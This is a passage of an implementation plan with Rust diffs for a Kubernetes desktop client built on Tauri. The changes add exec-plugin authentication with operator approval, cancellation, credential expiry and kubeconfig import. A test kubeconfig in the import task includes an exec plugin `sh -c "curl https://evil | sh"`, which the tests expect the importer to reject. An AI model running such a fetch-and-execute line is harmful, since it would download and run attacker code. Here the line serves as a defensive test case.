 pub mod exec;
 pub mod oauth;
 pub mod pkce;
+
+use std::collections::HashMap;
+use std::sync::Mutex;
+
+use tokio::sync::oneshot;
+
+use crate::sync::MutexExt;
+
+/// Идущие входы — через браузер и запуском exec-плагина: на подключение — один, новый
+/// отменяет прежний.
+#[derive(Default)]
+pub struct Logins {
+    inner: Mutex<LoginsInner>,
+}
+
+/// Счётчик входов и идущий вход каждого подключения: номер и сигнал отмены.
+#[derive(Default)]
+struct LoginsInner {
+    last: u64,
+    active: HashMap<String, (u64, oneshot::Sender<()>)>,
+}
+
+impl Logins {
+    /// Регистрирует вход и возвращает его номер и сигнал отмены.
+    pub fn begin(&self, id: &str) -> (u64, oneshot::Receiver<()>) {
+        let (tx, rx) = oneshot::channel();
+        let mut g = self.inner.lock_safe();
+        g.last += 1;
+        let n = g.last;
+        if let Some((_, old)) = g.active.insert(id.to_string(), (n, tx)) {
+            let _ = old.send(());
+        }
+        (n, rx)
+    }
+
+    /// Отменяет идущий вход подключения. `false` — входа не было.
+    pub fn cancel(&self, id: &str) -> bool {
+        match self.inner.lock_safe().active.remove(id) {
+            Some((_, tx)) => {
+                let _ = tx.send(());
+                true
+            }
+            None => false,
+        }
+    }
+
+    /// Снимает вход с учёта, если его не заменил более новый.
+    pub fn finish(&self, id: &str, n: u64) {
+        let mut g = self.inner.lock_safe();
+        if g.active.get(id).is_some_and(|(m, _)| *m == n) {
+            g.active.remove(id);
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn new_login_cancels_previous_and_finish_keeps_newer() {
+        let l = Logins::default();
+        let (n1, mut rx1) = l.begin("a");
+        let (n2, mut rx2) = l.begin("a");
+        assert!(rx1.try_recv().is_ok(), "прежний вход отменён");
+        l.finish("a", n1);
+        assert!(l.cancel("a"), "новый вход остался");
+        assert!(rx2.try_recv().is_ok());
+        assert!(!l.cancel("a"));
+        l.finish("a", n2);
+    }
+}
diff --git a/src-tauri/src/k8s/config.rs b/src-tauri/src/k8s/config.rs
--- a/src-tauri/src/k8s/config.rs
+++ b/src-tauri/src/k8s/config.rs
@@ -70,7 +70,7 @@ fn token(p: &ConnectionProfile, secrets: &dyn SecretStore) -> AppResult<String>
 
 /// `kube::Config` профиля. Таймаут ответа не задаётся: он оборвал бы долгие потоки (логи, watch);
 /// таймаут запроса ставит вызывающий код (`request_timeout`). У exec-плагина учётных данных здесь
-/// нет: их выдаёт запуск плагина (задача следующего шага), конфигурация — без них.
+/// нет: их выдаёт запуск плагина, и их подставляет `apply_exec_credential`.
 pub fn build_kube_config(
     p: &ConnectionProfile,
     secrets: &dyn SecretStore,
@@ -144,6 +144,24 @@ pub fn build_kube_config(
     Ok(c)
 }
 
+/// Учётные данные, которые выдал exec-плагин: клиентский сертификат или токен.
+pub fn apply_exec_credential(c: &mut kube::Config, cred: &crate::auth::exec::PluginCredential) {
+    use secrecy::ExposeSecret;
+    c.auth_info = match (&cred.client_certificate_pem, &cred.client_key_pem) {
+        (Some(cert), Some(key)) => AuthInfo {
+            client_certificate_data: Some(STANDARD.encode(cert.as_bytes())),
+            client_key_data: Some(SecretString::from(
+                STANDARD.encode(key.expose_secret().as_bytes()),
+            )),
+            ..Default::default()
+        },
+        _ => AuthInfo {
+            token: cred.token.clone(),
+            ..Default::default()
+        },
+    };
+}
+
 /// Таймаут одного запроса к API-серверу.
 pub fn request_timeout(p: &ConnectionProfile) -> Duration {
     Duration::from_millis(p.request_timeout_ms)
@@ -363,6 +381,30 @@ mod tests {
         );
     }
 
+    #[tokio::test]
+    async fn exec_profile_gets_credentials_from_the_plugin() {
+        let mut p = sample_profile("a");
+        p.auth = AuthConfig::Exec(crate::storage::profile::sample_exec());
+        let mut c = build_kube_config(&p, &MemoryStore::default(), &no_env).unwrap();
+        assert!(c.auth_info.token.is_none() && c.auth_info.client_key_data.is_none());
+        let mut cred = crate::auth::exec::PluginCredential {
+            token: Some(SecretString::from("t-exec")),
+            client_certificate_pem: None,
+            client_key_pem: None,
+            expires_at: None,
+        };
+        apply_exec_credential(&mut c, &cred);
+        assert_eq!(
+            c.auth_info.token.as_ref().unwrap().expose_secret(),
+            "t-exec"
+        );
+        cred.client_certificate_pem = Some(TEST_CERT_PEM.into());
+        cred.client_key_pem = Some(SecretString::from(TEST_KEY_PEM));
+        apply_exec_credential(&mut c, &cred);
+        assert!(c.auth_info.token.is_none(), "сертификат вместо токена");
+        assert!(kube::Client::try_from(c).is_ok());
+    }
+
     #[test]
     fn tls_server_name_and_timeouts_come_from_profile() {
         let mut p = sample_profile("a");
diff --git a/src-tauri/src/k8s/connectivity.rs b/src-tauri/src/k8s/connectivity.rs
--- a/src-tauri/src/k8s/connectivity.rs
+++ b/src-tauri/src/k8s/connectivity.rs
@@ -1,15 +1,16 @@
-//! Пошаговая проверка подключения (спец. §5.3): конфигурация → TCP → TLS → вход → discovery →
-//! проекты. Останавливается на первом неуспешном шаге и называет его.
+//! Пошаговая проверка подключения (спец. §5.3): конфигурация → TCP → [exec-плагин] → TLS → вход →
+//! discovery → проекты. Останавливается на первом неуспешном шаге и называет его.
 
 use std::sync::Arc;
 use std::time::Duration;
 
 use serde::Serialize;
+use tokio::sync::oneshot;
 
 use crate::error::{AppError, AppResult, ErrorCode};
 use crate::i18n::LocalizedText;
 use crate::k8s::cluster::{Discovered, discover, list_project_names, whoami};
-use crate::k8s::config::{build_kube_config, process_env, request_timeout};
+use crate::k8s::config::{apply_exec_credential, build_kube_config, process_env, request_timeout};
 use crate::k8s::errors::from_kube;
 use crate::policy::PolicyStatus;
 use crate::secrets::SecretStore;
@@ -237,15 +238,58 @@ pub async fn check_cluster(
     }
 }
 
+/// Exec-плагин без подтверждённой строки запуска не запускается и при проверке.
+fn ensure_exec_approved(p: &ConnectionProfile) -> AppResult<()> {
+    match &p.auth {
+        AuthConfig::Exec(e) if !crate::auth::exec::is_approved(e) => Err(app_err!(
+            ErrorCode::AuthFailed,
+            "errors.exec.notApproved",
+            "Confirm the exec plugin launch line in the connection settings"
+        )),
+        _ => Ok(()),
+    }
+}
+
+/// Что выдал exec-плагин: учётные данные и, если есть, их срок.
+fn exec_message(
+    p: &ConnectionProfile,
+    cred: &crate::auth::exec::PluginCredential,
+) -> LocalizedText {
+    let command = match &p.auth {
+        AuthConfig::Exec(e) => crate::auth::exec::command_name(&e.command),
+        _ => String::new(),
+    };
+    let expires = cred.expires_at.and_then(|t| {
+        time::OffsetDateTime::from(t)
+            .format(&time::format_description::well_known::Rfc3339)
+            .ok()
+    });
+    match expires {
+        Some(expires) => ltext!(
+            "messages.connectionTest.execOkUntil",
+            "The exec plugin {{command}} returned credentials valid until {{expires}}",
+            command = command,
+            expires = expires
+        ),
+        None => ltext!(
+            "messages.connectionTest.execOk",
+            "The exec plugin {{command}} returned credentials",
+            command = command
+        ),
+    }
+}
+
 /// Проверяет и несохранённый профиль: секреты берутся из `secrets` (поверх keychain — форма).
+/// У exec-плагина после TCP идёт шаг `exec` — запуск плагина; `cancel` прерывает его ожидание.
 pub async fn test_connection(
     p: &ConnectionProfile,
     secrets: Arc<dyn SecretStore>,
     policy: &PolicyStatus,
+    cancel: oneshot::Receiver<()>,
 ) -> TestReport {
     let mut steps = Vec::new();
     let profile = p.clone();
-    let config = match ensure_allowed(p, policy) {
+    let config = match ensure_allowed(p, policy).and_then(|()| ensure_exec_approved(p)) {
         Err(e) => Err(e),
         Ok(()) => tokio::task::spawn_blocking(move || {
             crate::storage::profile::validate_profile(&profile)?;
@@ -254,7 +298,7 @@ pub async fn test_connection(
         .await
         .unwrap_or_else(|e| Err(AppError::internal_with(e.to_string()))),
     };
-    let config = match config {
+    let mut config = match config {
         Ok(c) => c,
         Err(e) => return report(vec![failed_step("config", e)]),
     };
@@ -288,6 +332,20 @@ pub async fn test_connection(
         }
     }
 
+    if matches!(p.auth, AuthConfig::Exec(_)) {
+        let limit = crate::auth::oauth::LOGIN_TIMEOUT;
+        match crate::auth::exec::credential_for(p, cancel, limit).await {
+            Ok(cred) => {
+                steps.push(passed("exec", exec_message(p, &cred)));
+                apply_exec_credential(&mut config, &cred);
+            }
+            Err(e) => {
+                steps.push(failed_step("exec", e));
+                return report(steps);
+            }
+        }
+    }
+
     let client = match kube::Client::try_from(config) {
         Ok(c) => c,
         Err(e) => {
@@ -461,13 +519,12 @@ mod tests {
             allow_insecure_tls: false,
             ..PolicyStatus::default()
         };
+        let test = |p: ConnectionProfile, s: MemoryStore, policy: PolicyStatus| async move {
+            let (_keep, cancel) = oneshot::channel();
+            test_connection(&p, Arc::new(s), &policy, cancel).await
+        };
         // Нет токена.
-        let r = test_connection(
-            &sample_profile("a"),
-            Arc::new(MemoryStore::default()),
-            &open,
-        )
-        .await;
+        let r = test(sample_profile("a"), MemoryStore::default(), open.clone()).await;
         assert!(!r.ok);
         assert_eq!(names(&r.steps), [("config", false)]);
         assert_eq!(
@@ -479,7 +536,7 @@ mod tests {
         p.ca = CaConfig::Insecure;
         let secrets = MemoryStore::default();
         secrets.set(&secret_key("a", TOKEN), "t").unwrap();
-        let r = test_connection(&p, Arc::new(secrets), &strict).await;
+        let r = test(p, secrets, strict).await;
         assert_eq!(
             r.steps[0].error.as_ref().unwrap().key,
             "errors.connections.insecureForbidden"
@@ -487,11 +544,20 @@ mod tests {
         // Невалидный профиль.
         let mut p = sample_profile("a");
         p.api_url = "http://api.c:6443".into();
-        let r = test_connection(&p, Arc::new(MemoryStore::default()), &open).await;
+        let r = test(p, MemoryStore::default(), open.clone()).await;
         assert_eq!(
             r.steps[0].error.as_ref().unwrap().key,
             "errors.connections.httpsRequired"
         );
+        // Строка запуска exec-плагина не подтверждена: плагин не запускается.
+        let mut p = sample_profile("a");
+        p.auth = AuthConfig::Exec(crate::storage::profile::sample_exec());
+        let r = test(p, MemoryStore::default(), open).await;
+        assert_eq!(names(&r.steps), [("config", false)]);
+        assert_eq!(
+            r.steps[0].error.as_ref().unwrap().key,
+            "errors.exec.notApproved"
+        );
     }
 
     #[tokio::test]
@@ -504,7 +570,57 @@ mod tests {
         p.proxy = crate::storage::profile::ProxyConfig::None;
         let secrets = MemoryStore::default();
         secrets.set(&secret_key("a", TOKEN), "t").unwrap();
-        let r = test_connection(&p, Arc::new(secrets), &PolicyStatus::default()).await;
+        let (_keep, cancel) = oneshot::channel();
+        let r = test_connection(&p, Arc::new(secrets), &PolicyStatus::default(), cancel).await;
         assert_eq!(names(&r.steps), [("config", true), ("tcp", false)]);
     }
+
+    /// Шаг `exec` идёт после TCP: плагин — скрипт `sh` с именем `kubectl`.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn exec_plugin_step_runs_after_tcp() {
+        use std::os::unix::fs::PermissionsExt;
+        let dir = tempfile::tempdir().unwrap();
+        let plugin = dir.path().join("kubectl");
+        std::fs::write(
+            &plugin,
+            "#!/bin/sh\nprintf '{\"status\":{\"token\":\"t\",\"expirationTimestamp\":\"2030-01-01T00:00:00Z\"}}'\n",
+        )
+        .unwrap();
+        std::fs::set_permissions(&plugin, std::fs::Permissions::from_mode(0o755)).unwrap();
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let port = listener.local_addr().unwrap().port();
+        // Сервер принимает соединения и сразу закрывает их: TLS дальше не пройдёт.
+        tokio::spawn(async move {
+            while let Ok((s, _)) = listener.accept().await {
+                drop(s);
+            }
+        });
+        let mut exec = crate::storage::profile::sample_exec();
+        exec.command = plugin.display().to_string();
+        exec.approved = Some(crate::auth::exec::fingerprint(&exec));
+        let mut p = sample_profile("a");
+        p.api_url = format!("https://127.0.0.1:{port}");
+        p.proxy = crate::storage::profile::ProxyConfig::None;
+        p.auth = AuthConfig::Exec(exec);
+        let (_keep, cancel) = oneshot::channel();
+        let r = test_connection(
+            &p,
+            Arc::new(MemoryStore::default()),
+            &PolicyStatus::default(),
+            cancel,
+        )
+        .await;
+        assert_eq!(
+            names(&r.steps)[..3],
+            [("config", true), ("tcp", true), ("exec", true)]
+        );
+        assert_eq!(
+            r.steps[2].message.key,
+            "messages.connectionTest.execOkUntil"
+        );
+        assert_eq!(r.steps[2].message.params["expires"], "2030-01-01T00:00:00Z");
+        assert_eq!(r.steps[2].message.params["command"], "kubectl");
+        assert!(!r.ok, "TLS не прошёл");
+    }
 }
diff --git a/src-tauri/src/k8s/pool.rs b/src-tauri/src/k8s/pool.rs
--- a/src-tauri/src/k8s/pool.rs
+++ b/src-tauri/src/k8s/pool.rs
@@ -2,14 +2,16 @@
 
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
-use std::time::Duration;
+use std::time::{Duration, SystemTime};
+
+use tokio::sync::oneshot;
 
 use crate::error::{AppError, AppResult};
 use crate::k8s::cluster::{ConnectionInfo, probe};
-use crate::k8s::config::{build_kube_config, process_env, request_timeout};
+use crate::k8s::config::{apply_exec_credential, build_kube_config, process_env, request_timeout};
 use crate::k8s::errors::from_kube;
 use crate::secrets::SecretStore;
-use crate::storage::profile::ConnectionProfile;
+use crate::storage::profile::{AuthConfig, ConnectionProfile};
 use crate::sync::MutexExt;
 
 pub struct Connected {
@@ -17,6 +19,16 @@ pub struct Connected {
     pub info: ConnectionInfo,
     /// Таймаут одного запроса (из профиля).
     pub timeout: Duration,
+    /// Когда истекают учётные данные exec-плагина (`expirationTimestamp`).
+    pub expires_at: Option<SystemTime>,
+}
+
+impl Connected {
+    /// Учётные данные истекают в ближайшую минуту: пора запустить плагин снова.
+    pub fn expiring(&self, now: SystemTime) -> bool {
+        self.expires_at
+            .is_some_and(|t| now + Duration::from_secs(60) >= t)
+    }
 }
 
 /// Клиенты подключений. Поколение растёт при каждом сбросе: клиент, который подключался
@@ -24,6 +36,9 @@ pub struct Connected {
 #[derive(Default)]
 pub struct ClientPool {
     inner: Mutex<PoolInner>,
+    /// По замку на подключение: одновременные подключения ждут первое, а не запускают
+    /// exec-плагин ещё раз.
+    connecting: Mutex<HashMap<String, Arc<tokio::sync::Mutex<()>>>>,
 }
 
 #[derive(Default)]
@@ -56,6 +71,17 @@ impl ClientPool {
         true
     }
 
+    /// Замок подключения `id` на время подключения.
+    pub async fn connect_lock(&self, id: &str) -> tokio::sync::OwnedMutexGuard<()> {
+        let lock = self
+            .connecting
+            .lock_safe()
+            .entry(id.to_string())
+            .or_default()
+            .clone();
+        lock.lock_owned().await
+    }
+
     /// Сбрасывает клиент подключения. `true` — клиент был.
     pub fn evict(&self, id: &str) -> bool {
         let mut inner = self.inner.lock_safe();
@@ -64,23 +90,34 @@ impl ClientPool {
     }
 }
 
-/// Новое подключение: клиент из профиля (keychain — на blocking-потоке) и `probe`.
+/// Новое подключение: клиент из профиля (keychain — на blocking-потоке), учётные данные
+/// exec-плагина (`cancel` прерывает его ожидание) и `probe`.
 pub async fn open(
     profile: ConnectionProfile,
     secrets: Arc<dyn SecretStore>,
+    cancel: oneshot::Receiver<()>,
 ) -> AppResult<Connected> {
     let timeout = request_timeout(&profile);
-    let config = tokio::task::spawn_blocking(move || {
-        build_kube_config(&profile, secrets.as_ref(), &process_env)
-    })
-    .await
-    .map_err(|e| AppError::internal_with(e.to_string()))??;
+    let p = profile.clone();
+    let mut config =
+        tokio::task::spawn_blocking(move || build_kube_config(&p, secrets.as_ref(), &process_env))
+            .await
+            .map_err(|e| AppError::internal_with(e.to_string()))??;
+    let mut expires_at = None;
+    if matches!(profile.auth, AuthConfig::Exec(_)) {
+        let cred =
+            crate::auth::exec::credential_for(&profile, cancel, crate::auth::oauth::LOGIN_TIMEOUT)
+                .await?;
+        expires_at = cred.expires_at;
+        apply_exec_credential(&mut config, &cred);
+    }
     let client = kube::Client::try_from(config).map_err(|e| from_kube(&e))?;
     let info = probe(&client, timeout).await?;
     Ok(Connected {
         client,
         info,
         timeout,
+        expires_at,
     })
 }
 
@@ -102,6 +139,7 @@ mod tests {
                 capabilities: Capabilities::default(),
             },
             timeout: Duration::from_secs(1),
+            expires_at: None,
         })
     }
 
@@ -125,10 +163,56 @@ mod tests {
     #[tokio::test]
     async fn open_reports_missing_token_without_network() {
         let p = crate::storage::profile::sample_profile("a");
-        let e = open(p, Arc::new(crate::secrets::MemoryStore::default()))
+        let (_keep, cancel) = oneshot::channel();
+        let e = open(p, Arc::new(crate::secrets::MemoryStore::default()), cancel)
             .await
             .err()
             .unwrap();
         assert_eq!(e.key, "errors.connections.tokenMissing");
     }
+
+    #[tokio::test]
+    async fn unapproved_exec_plugin_is_not_started() {
+        let mut p = crate::storage::profile::sample_profile("a");
+        p.auth = AuthConfig::Exec(crate::storage::profile::sample_exec());
+        let (_keep, cancel) = oneshot::channel();
+        let e = open(p, Arc::new(crate::secrets::MemoryStore::default()), cancel)
+            .await
+            .err()
+            .unwrap();
+        assert_eq!(e.key, "errors.exec.notApproved");
+    }
+
+    #[tokio::test]
+    async fn exec_credentials_expire_a_minute_early() {
+        let (client, _) = crate::k8s::testing::mock_client(|_| (200, serde_json::json!({})));
+        let now = SystemTime::now();
+        let mut c = Connected {
+            client,
+            info: connected().info.clone(),
+            timeout: Duration::from_secs(1),
+            expires_at: None,
+        };
+        assert!(!c.expiring(now), "токен без срока");
+        c.expires_at = Some(now + Duration::from_secs(30));
+        assert!(c.expiring(now));
+        c.expires_at = Some(now + Duration::from_secs(600));
+        assert!(!c.expiring(now));
+    }
+
+    #[tokio::test]
+    async fn connect_lock_serializes_connections_of_one_profile() {
+        let pool = ClientPool::default();
+        let first = pool.connect_lock("a").await;
+        let other = tokio::time::timeout(Duration::from_millis(50), pool.connect_lock("b")).await;
+        assert!(other.is_ok(), "другое подключение не ждёт");
+        let same = tokio::time::timeout(Duration::from_millis(50), pool.connect_lock("a")).await;
+        assert!(same.is_err(), "второе подключение того же профиля ждёт");
+        drop(first);
+        assert!(
+            tokio::time::timeout(Duration::from_millis(50), pool.connect_lock("a"))
+                .await
+                .is_ok()
+        );
+    }
 }
diff --git a/src-tauri/src/state.rs b/src-tauri/src/state.rs
--- a/src-tauri/src/state.rs
+++ b/src-tauri/src/state.rs
@@ -1,10 +1,12 @@
 use std::path::Path;
 use std::sync::Arc;
+use std::time::SystemTime;
 
 use crate::error::{AppError, AppResult, ErrorCode};
 use crate::k8s::pool::{ClientPool, Connected, open};
 use crate::secrets::SecretStore;
 use crate::storage::connections::ConnectionStore;
+use crate::storage::profile::AuthConfig;
 
 /// Общее состояние приложения: хранилища, политика и подключённые кластеры.
 /// Клонируется дёшево (всё за `Arc`).
@@ -15,6 +17,8 @@ pub struct AppState {
     pub policy: Arc<crate::policy::Policy>,
     pub settings: Arc<crate::settings::SettingsStore>,
     pub pool: Arc<ClientPool>,
+    /// Идущие входы: через браузер и запуском exec-плагина.
+    pub logins: Arc<crate::auth::Logins>,
 }
 
 impl AppState {
@@ -25,6 +29,7 @@ impl AppState {
             policy: Arc::new(crate::policy::Policy::default()),
             settings: Arc::new(crate::settings::SettingsStore::open(data_dir)),
             pool: Arc::new(ClientPool::default()),
+            logins: Arc::new(crate::auth::Logins::default()),
         })
     }
 
@@ -34,16 +39,31 @@ impl AppState {
         self
     }
 
-    /// Клиент подключения: из пула или новое подключение (`fresh` — всегда новое).
+    /// Клиент подключения: из пула или новое подключение (`fresh` — всегда новое; истекающие
+    /// учётные данные exec-плагина — тоже). Подключения одного профиля идут по очереди, ожидание
+    /// exec-плагина отменяется так же, как вход через браузер (`logins`).
     pub async fn connected(&self, id: &str, fresh: bool) -> AppResult<Arc<Connected>> {
+        let _turn = self.pool.connect_lock(id).await;
         if fresh {
             self.pool.evict(id);
-        } else if let Some(c) = self.pool.get(id) {
+        } else if let Some(c) = self.pool.get(id)
+            && !c.expiring(SystemTime::now())
+        {
             return Ok(c);
         }
         let generation = self.pool.generation(id);
         let profile = self.connections.get(id)?;
-        let c = Arc::new(open(profile, self.secrets.clone()).await?);
+        let login = matches!(profile.auth, AuthConfig::Exec(_)).then(|| self.logins.begin(id));
+        let (n, cancel) = match login {
+            Some((n, rx)) => (Some(n), rx),
+            // Не exec-плагин: `open` сигнал отмены не ждёт.
+            None => (None, tokio::sync::oneshot::channel().1),
+        };
+        let result = open(profile, self.secrets.clone(), cancel).await;
+        if let Some(n) = n {
+            self.logins.finish(id, n);
+        }
+        let c = Arc::new(result?);
         self.pool.insert_if_current(id, generation, c.clone());
         Ok(c)
     }
````

Применить: `python3 /tmp/o1a-blocks.py step 10.1`.

- [ ] **Step 2: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 167 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 3: Commit.**

```bash
git add -A
git commit -s -m "feat(auth): запуск exec-плагина — учётные данные, таймаут и отмена, подключение и пошаговая проверка" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 11: Импорт контекстов kubeconfig

**Files:**
- Create: `src-tauri/src/k8s/kubeconfig.rs`
- Modify: `src-tauri/src/k8s/mod.rs`

**Interfaces:**
- Consumes: задачи 3–4, 9.
- Produces: `k8s::kubeconfig::{ResolveCommand, ImportAuth::{Token, ClientCert, Browser, Exec}, KubeContext { name, cluster, server, user, namespace, auth, insecure, current, exec, unsupported, existing_id }, KubeconfigPreview { path, contexts }, ImportedContext { profile, token, client_key }, default_path(env, home), read(&Path), preview(&Kubeconfig, &Path, &[ConnectionProfile], &PolicyStatus, ResolveCommand), import_context(&Kubeconfig, name, &KubeContext) -> AppResult<ImportedContext>}`.

Спец. §5.5. Файл по умолчанию — первый путь из `KUBECONFIG`, иначе `~/.kube/config`; разбор — `kube::config::Kubeconfig::read_from` (пути делаются абсолютными). Токен и `tokenFile` → способ «Токен», клиентский сертификат → «Сертификат», exec-плагин из списка разрешённых → «Exec-плагин» со строкой запуска (команда разрешается в абсолютный путь функцией поиска из параметров; не найдена, не из списка или `interactiveMode: Always` — причина в предпросмотре), `auth-provider` не поддерживается, без учётных данных (или логин и пароль) → «Браузер». Подтверждения строки запуска в предпросмотре нет: его ставит человек в диалоге (задачи 12 и 17). Данные копируются в момент импорта: CA из `*-data` или файла — в профиль, токен и ключ — в секреты. Совпадение с сохранённым подключением — по имени и адресу API. Политика запрещает в предпросмотре контексты `insecure` и с exec-плагином.

- [ ] **Step 1: Тесты.**

<!-- block: file t11-src-tauri-src-k8s-kubeconfig-rs-tests step=11.1 path=src-tauri/src/k8s/kubeconfig.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::profile::{TEST_CERT_PEM, sample_profile};

    fn kc(yaml: &str) -> Kubeconfig {
        Kubeconfig::from_yaml(yaml).unwrap()
    }

    /// Команды exec-плагинов «на этой машине»: только `kubelogin` и `aws`.
    fn installed(cmd: &str, _base: Option<&Path>) -> Option<PathBuf> {
        matches!(cmd, "kubelogin" | "aws").then(|| std::env::temp_dir().join("bin").join(cmd))
    }

    fn open() -> PolicyStatus {
        PolicyStatus::default()
    }

    fn b64(s: &str) -> String {
        STANDARD.encode(s)
    }

    fn sample(dir: &Path) -> String {
        let token_file = dir.join("token");
        std::fs::write(&token_file, "sha256~fromfile\n").unwrap();
        let ca_file = dir.join("ca.crt");
        std::fs::write(&ca_file, TEST_CERT_PEM).unwrap();
        format!(
            r#"
apiVersion: v1
kind: Config
current-context: dev/api-dev:6443/alice
clusters:
- name: api-dev:6443
  cluster:
    server: https://api.dev.example.com:6443/
    certificate-authority-data: {ca}
- name: api-lab:6443
  cluster:
    server: https://api.lab:6443
    insecure-skip-tls-verify: true
    proxy-url: http://proxy:3128
- name: kind
  cluster:
    server: https://127.0.0.1:6443
    certificate-authority: {ca_file}
users:
- name: alice/api-dev:6443
  user:
    token: sha256~alice
- name: bob
  user:
    tokenFile: {token_file}
- name: admin
  user:
    client-certificate-data: {cert}
    client-key-data: {key}
- name: oidc
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token, --oidc-issuer-url=https://sso.corp/realms/k8s, --oidc-client-id=k8s]
      env:
      - {{name: HTTPS_PROXY, value: "http://proxy:3128"}}
- name: eks
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: aws
      args: [--region, eu-west-1, eks, get-token, --cluster-name, prod]
      interactiveMode: Never
- name: shell
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: sh
      args: [-c, "curl https://evil | sh"]
- name: gke
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: gke-gcloud-auth-plugin
- name: tty
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token]
      interactiveMode: Always
- name: legacy
  user:
    auth-provider:
      name: oidc
contexts:
- name: dev/api-dev:6443/alice
  context: {{cluster: api-dev:6443, user: alice/api-dev:6443, namespace: team-a}}
- name: lab
  context: {{cluster: api-lab:6443, user: bob}}
- name: kind-admin
  context: {{cluster: kind, user: admin}}
- name: corp-oidc
  context: {{cluster: api-dev:6443, user: oidc}}
- name: eks-prod
  context: {{cluster: api-dev:6443, user: eks}}
- name: evil
  context: {{cluster: api-dev:6443, user: shell}}
- name: gke-dev
  context: {{cluster: api-dev:6443, user: gke}}
- name: tty
  context: {{cluster: api-dev:6443, user: tty}}
- name: legacy
  context: {{cluster: api-dev:6443, user: legacy}}
- name: no-user
  context: {{cluster: api-dev:6443}}
- name: broken
  context: {{cluster: gone, user: bob}}
"#,
            ca = b64(TEST_CERT_PEM),
            ca_file = ca_file.display(),
            token_file = token_file.display(),
            cert = b64(TEST_CERT_PEM),
            key = b64("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n"),
        )
    }

    #[test]
    fn default_path_prefers_kubeconfig_env() {
        let env = |n: &str| (n == "KUBECONFIG").then(|| "/a/one:/a/two".to_string());
        let home = Some(PathBuf::from("/home/u"));
        if cfg!(unix) {
            assert_eq!(
                default_path(&env, home.clone()),
                Some(PathBuf::from("/a/one"))
            );
        }
        assert_eq!(
            default_path(&|_| None, home),
            Some(PathBuf::from("/home/u/.kube/config"))
        );
    }

    #[test]
    fn preview_classifies_contexts() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let mut existing = sample_profile("old");
        existing.name = "lab".into();
        existing.api_url = "https://api.lab:6443".into();
        let p = preview(&k, dir.path(), &[existing], &open(), &installed);
        let by = |n: &str| p.contexts.iter().find(|c| c.name == n).unwrap().clone();
        let dev = by("dev/api-dev:6443/alice");
        assert_eq!(dev.auth, ImportAuth::Token);
        assert!(dev.current);
        assert_eq!(dev.server, "https://api.dev.example.com:6443");
        assert_eq!(dev.namespace.as_deref(), Some("team-a"));
        assert!(dev.unsupported.is_none());
        let lab = by("lab");
        assert!(lab.insecure);
        assert_eq!(lab.existing_id.as_deref(), Some("old"));
        assert_eq!(by("kind-admin").auth, ImportAuth::ClientCert);
        let oidc = by("corp-oidc");
        assert_eq!(
            (oidc.auth, oidc.unsupported.clone()),
            (ImportAuth::Exec, None)
        );
        let exec = oidc.exec.unwrap();
        assert_eq!(
            exec.command,
            installed("kubelogin", None).unwrap().display().to_string()
        );
        assert_eq!(exec.args[0], "get-token");
        assert_eq!(exec.env[0].name, "HTTPS_PROXY");
        assert_eq!(exec.approved, None, "подтверждает человек в диалоге");
        let eks = by("eks-prod").exec.unwrap();
        assert_eq!(eks.api_version, "client.authentication.k8s.io/v1beta1");
        for (name, key) in [
            ("evil", "errors.exec.notAllowed"),
            ("gke-dev", "errors.kubeconfig.execNotFound"),
            ("tty", "errors.kubeconfig.execInteractive"),
            ("legacy", "errors.kubeconfig.authProvider"),
        ] {
            assert_eq!(by(name).unsupported.unwrap().key, key, "{name}");
        }
        assert_eq!(by("no-user").auth, ImportAuth::Browser);
        assert_eq!(
            by("broken").unsupported.unwrap().key,
            "errors.kubeconfig.noCluster"
        );

        let policy = PolicyStatus {
            allow_insecure_tls: false,
            allow_exec_auth: false,
            ..PolicyStatus::default()
        };
        let strict = preview(&k, dir.path(), &[], &policy, &installed);
        let key = |n: &str| {
            let c = strict.contexts.iter().find(|c| c.name == n).unwrap();
            c.unsupported.as_ref().unwrap().key.clone()
        };
        assert_eq!(key("lab"), "errors.connections.insecureForbidden");
        assert_eq!(key("corp-oidc"), "errors.connections.execForbidden");
    }

    #[test]
    fn import_copies_data_and_secrets() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let p = preview(&k, dir.path(), &[], &open(), &installed);
        let get = |n: &str| {
            let c = p.contexts.iter().find(|c| c.name == n).unwrap();
            import_context(&k, n, c)
        };

        let dev = get("dev/api-dev:6443/alice").unwrap();
        assert_eq!(dev.profile.api_url, "https://api.dev.example.com:6443");
        assert_eq!(dev.profile.auth, AuthConfig::Token);
        assert_eq!(
            dev.profile.ca,
            CaConfig::Pem {
                pem: TEST_CERT_PEM.into()
            }
        );
        assert_eq!(dev.profile.favorite_namespaces, vec!["team-a"]);
        assert_eq!(dev.profile.environment, Environment::Dev);
        assert_eq!(dev.token.as_deref(), Some("sha256~alice"));
        assert!(dev.client_key.is_none());

        let lab = get("lab").unwrap();
        assert_eq!(lab.profile.ca, CaConfig::Insecure);
        assert_eq!(
            lab.profile.proxy,
            ProxyConfig::Url {
                url: "http://proxy:3128".into()
            }
        );
        assert_eq!(lab.token.as_deref(), Some("sha256~fromfile"));

        let kind = get("kind-admin").unwrap();
        assert_eq!(
            kind.profile.auth,
            AuthConfig::ClientCert {
                certificate_pem: TEST_CERT_PEM.into()
            }
        );
        assert!(
            kind.client_key
                .unwrap()
                .starts_with("-----BEGIN PRIVATE KEY-----")
